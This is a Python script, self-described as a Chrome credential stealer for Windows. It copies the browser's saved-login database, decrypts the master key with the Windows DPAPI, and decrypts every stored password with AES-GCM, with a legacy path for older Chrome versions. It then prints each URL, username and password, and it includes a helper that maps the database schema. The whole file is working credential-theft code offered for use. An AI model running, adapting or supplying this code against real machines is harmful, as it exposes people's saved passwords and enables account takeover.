""" IMPORTS """
# Utilities
import os
import sqlite3
import json
from base64 import b64decode
from shutil import copyfile
# Cryptography
from Crypto.Cipher import AES
import pywintypes
# pypiwin32
# from win32 import win32crypt
from win32crypt import CryptUnprotectData

""" CONSTANTS """
# File paths
CHROME_PATH = os.getenv('localappdata') + r'\Google\Chrome\User Data'
LOCAL_STATE_PATH = CHROME_PATH + r'\Local State'
ORIGINAL_DB_PATH = CHROME_PATH + r'\Default\Login Data'
TEMP_DB_PATH = '4x13.4x'

# Encryption key prefix
ENC_KEY_PREFIX = len('DPAPI')

# Password encryption format: {prefix}{nonce}{encrypted_payload}{additional_data}
ENC_PREFIX_LEN = len('v10')
ENC_NONCE_LEN = 96 // 8
ENC_ADD_DATA_LEN = 16 # formula 128 / 8



def windows_stealer():
    """ Steals Chrome Credentials from a Windows machine """
    # Copy original sqlite3 database to access it without killing any active Chrome processes
    copyfile(ORIGINAL_DB_PATH, TEMP_DB_PATH)

    # Access sqlite3 database
    db_connection = sqlite3.connect(TEMP_DB_PATH)
    cursor = db_connection.cursor()
    # sqli_recon(cursor)

    # Extract credentials from database
    cursor.execute('SELECT action_url, username_value, password_value FROM logins')
    data = cursor.fetchall()

    # Decrypt passwords
    encryption_key = get_encryption_key()
    credentials = decrypt_passwords(data, encryption_key)

    # Display credentials
    for credential in credentials:
        print('\n'.join(['=' * 50, credential['url'], credential['username'], credential['password']]))

    # Close sqlite3 connection, remove temporary database and return dictionary of extracted credentials
    cursor.close()
    db_connection.close()
    os.remove(TEMP_DB_PATH)

    return credentials


def get_encryption_key():
    """ Retrieve the encryption / master key for AES encryption and decryption """
    # Extract the encrypted encryption key from local state
    with open(LOCAL_STATE_PATH, 'r') as f:
        encryption_key = json.load(f)['os_crypt']['encrypted_key']
    # Decode the key and remove the 'DPAPI' prefix
    encryption_key = b64decode(encryption_key)[ENC_KEY_PREFIX:]
    # Decrypt the key using the win32crypt API
    encryption_key = CryptUnprotectData(encryption_key, None, None, None, 0)[1]
    return encryption_key


def decrypt_password(encrypted_password, encryption_key):
    """ Decrypt passwords saved on Chrome version >= 80 """
    # encrypted password format: {prefix}{nonce}{encrypted_payload}{additional_data}
    # Extract nonce and encrypted payload (containing plaintext password)
    nonce = encrypted_password[ENC_PREFIX_LEN: ENC_PREFIX_LEN + ENC_NONCE_LEN]
    encrypted_payload = encrypted_password[ENC_PREFIX_LEN + ENC_NONCE_LEN: -ENC_ADD_DATA_LEN]
    # Decipher the AES-encrypted payload with encryption key and nonce
    cipher = AES.new(encryption_key, AES.MODE_GCM, nonce)
    extracted_password = cipher.decrypt(encrypted_payload).decode('utf-8')
    return extracted_password


def decrypt_password_legacy(encrypted_password):
    """ Decrypt passwords saved on Chrome version < 80 """
    return CryptUnprotectData(encrypted_password, None, None, None, 0)[1]


def decrypt_passwords(data, encryption_key):
    """ Decrypts the encrypted passwords from data """
    credentials = []
    for url, username, encrypted_password in data:
        # Decrypt password
        decrypted_password = ''
        try:
            # Try to decrypt passwords saved on Chrome versions earlier than 80
            decrypted_password = decrypt_password_legacy(encrypted_password)
        except pywintypes.error:
            # Try to decrypt passwords saved on Chrome versions 80 or later
            decrypted_password = decrypt_password(encrypted_password, encryption_key)

        # Add extracted credentials to a list
        credentials.append({
            'url': url,
            'username': username,
            'password': decrypted_password,
        })

    return credentials


def sqli_recon(db_cursor):
    """ SQL queries to learn more about the database structure """
    # To find tables
    db_cursor.execute('SELECT name FROM sqlite_master WHERE type="table"')
    print(db_cursor.fetchall())
    # Table of interest: logins

    # To find columns for logins table
    db_cursor.execute('PRAGMA table_info(logins)')
    print([row[1] for row in db_cursor.fetchall()])
    # Columns of interest: action_url, username_value, password_value



if __name__ == '__main__':
    windows_stealer()
